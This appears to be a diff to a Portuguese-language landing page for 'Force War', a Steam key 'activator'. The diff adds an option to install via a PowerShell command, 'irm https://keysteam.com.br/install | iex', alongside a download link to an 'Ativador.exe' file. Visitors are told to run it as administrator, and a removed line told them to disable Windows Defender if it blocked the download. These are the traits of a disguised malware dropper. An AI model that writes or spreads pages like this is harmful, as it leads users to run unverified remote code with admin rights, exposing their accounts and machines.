@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Force War — Downloads</title>
+  <title>Force War — Como utilizar sua key</title>
   <meta name="description" content="Ativador de keys para Steam." />
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -139,6 +139,7 @@
     .step{display:flex;gap:16px;align-items:flex-start}
     .step .num{min-width:46px;height:46px;border-radius:10px;background:rgba(255,255,255,0.05);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:18px;color:#fff;}
   </style>
+  <link rel="stylesheet" href="./install-options.css?v=2" />
 </head>
 <body>
 
@@ -222,7 +223,7 @@
     <section class="hero">
       <div class="info">
         <h1>Ative sua key com segurança e rapidez</h1>
-        <p>Baixe o Executor para acessar o game via Steam.<br>Use o Ativador apenas após ler as instruções abaixo.</p>
+        <p>Instale pelo Executor ou pelo comando PowerShell.<br>Escolha uma das opções abaixo e siga o passo a passo.</p>
         <p style="margin-top:12px;color:var(--muted);font-size:15px">Aviso: siga as instruções de uso; não compartilhe suas credenciais. Esteja ciente das políticas da Steam.</p>
 
         <div class="hero-links">
@@ -231,24 +232,52 @@
         </div>
       </div>
 
-      <div style="min-width:260px;display:flex;flex-direction:column;gap:14px;align-items:flex-end">
-        <a class="btn btn-download" href="#" id="dl-executor" download>
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
-            <path d="M12 3v12" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
-            <path d="M21 15v4a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1v-4" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
-          </svg>
-          Baixar Executor
-        </a>
-      </div>
     </section>
 
     <section class="instructions">
       <h4>Como usar (rápido)</h4>
       <div class="steps">
-        <div class="step"><div class="num">1</div><div><strong>Baixe o Executor</strong> e salve em uma pasta temporária. Não execute antes de ler o próximo passo.<br><small>Obs.: caso seu navegador ou Windows Defender bloqueie o download, desative temporariamente e habilite novamente após o processo.</small></div></div>
-        <div class="step"><div class="num">2</div><div>Abra o Executor com privilégios administrativos (clique com o botão direito → Executar como administrador).</div></div>
-        <div class="step"><div class="num">3</div><div>Ao executar, sua Steam irá reiniciar e abrir novamente.</div></div>
+        <div class="step"><div class="num">1</div><div><strong>Escolha uma alternativa:</strong> baixe o Executor ou copie o comando PowerShell na área abaixo. Basta usar uma das opções.</div></div>
+        <div class="step"><div class="num">2</div><div><strong>Pelo arquivo:</strong> clique com o botão direito no Executor e selecione <strong>Executar como administrador</strong>.<br><strong>Pelo PowerShell:</strong> abra o PowerShell, cole o comando e pressione Enter. Confirme a solicitação de administrador do Windows.</div></div>
+        <div class="step"><div class="num">3</div><div>Aguarde a operação terminar e a Steam reabrir.</div></div>
         <div class="step"><div class="num">4</div><div>Pronto, basta colocar sua key de acesso em: <strong>Ativar um código de produto</strong>.</div></div>
+      </div>
+    </section>
+
+    <section class="install-guide" aria-labelledby="install-guide-title">
+      <div class="guide-heading">
+        <span class="guide-eyebrow">TUTORIAL E INSTALAÇÃO</span>
+        <h2 id="install-guide-title">Como utilizar sua key</h2>
+        <p>Assista ao vídeo e escolha como instalar. As duas opções preparam o Executor para você ativar sua key na Steam.</p>
+      </div>
+
+      <div class="tutorial-video">
+        <iframe id="tutorial-frame" src="https://www.youtube-nocookie.com/embed/LkSrd3zlEpY" title="Tutorial Force War — como utilizar sua key" loading="lazy" referrerpolicy="strict-origin-when-cross-origin" allow="autoplay; encrypted-media; picture-in-picture; fullscreen" allowfullscreen></iframe>
+      </div>
+      <div class="video-caption"><span>Tutorial passo a passo</span><a id="tutorial-link" href="https://youtu.be/LkSrd3zlEpY" target="_blank" rel="noopener noreferrer">Assistir no YouTube <span aria-hidden="true">↗</span></a></div>
+
+      <div class="install-options">
+        <article class="install-option">
+          <div class="option-heading">
+            <span class="option-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m-4-4 4 4 4-4M4 16v4h16v-4" /></svg></span>
+            <div><h3>Executor para Windows</h3><p>Baixe o arquivo e inicie como administrador.</p></div>
+          </div>
+          <p class="option-description">Prefere fazer o download manual? Salve o Executor no computador e siga as instruções acima.</p>
+          <a class="btn btn-download option-action" id="dl-executor" href="https://github.com/forcewarltda-crypto/Ativador-.exe/releases/download/v5.0/Ativador.exe"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v12m-4-4 4 4 4-4M4 16v4h16v-4" /></svg>Baixar .exe</a>
+        </article>
+
+        <article class="install-option">
+          <div class="option-heading">
+            <span class="option-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="m5 6 5 6-5 6m9 0h6" /></svg></span>
+            <div><h3>Instalar via PowerShell</h3><p>Copie, cole no PowerShell e pressione Enter.</p></div>
+          </div>
+          <p class="option-description">O comando baixa o mesmo Executor, verifica o arquivo e solicita permissão de administrador para abri-lo.</p>
+          <div class="command-box">
+            <code id="install-command" tabindex="0" aria-label="Comando de instalação">irm https://keysteam.com.br/install | iex</code>
+            <button id="copy-command" type="button" aria-label="Copiar comando PowerShell" title="Copiar comando"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="8" y="8" width="12" height="12" rx="2"/><path d="M16 8V4H4v12h4"/></svg></button>
+          </div>
+          <p id="copy-status" class="copy-status" role="status" aria-live="polite"></p>
+        </article>
       </div>
     </section>
 
@@ -280,12 +309,7 @@
     </footer>
   </main>
 
-  <script src="./js/force-war-config.js?v=4.6.6"></script>
-  <script>
-    const CONFIG = window.FW_SITE_CONFIG;
-
-    document.getElementById('dl-executor').href = CONFIG.executorUrl;
-    document.getElementById('site-version').textContent = CONFIG.version;
-  </script>
+  <script src="./js/force-war-config.js?v=2"></script>
+  <script src="./js/install-options.js?v=2"></script>
 </body>
 </html>
